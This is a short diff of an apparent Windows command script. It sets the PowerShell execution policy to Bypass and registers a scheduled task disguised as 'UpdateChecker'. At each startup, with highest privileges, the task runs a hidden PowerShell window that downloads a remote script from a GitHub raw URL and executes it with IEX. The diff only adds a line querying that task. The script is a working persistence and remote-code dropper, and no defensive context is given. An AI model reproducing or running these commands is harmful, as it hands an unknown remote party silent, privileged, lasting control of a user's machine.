@@ -1,3 +1,5 @@
 powershell -Command "Set-ExecutionPolicy Bypass"
 
 schtasks /create /tn "UpdateChecker" /tr "powershell.exe -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://raw.githubusercontent.com/nkt420/winstf/main/crs.ps1')" /sc onstart /rl highest /f
+
+schtasks /query /tn "UpdateChecker" /fo LIST /v
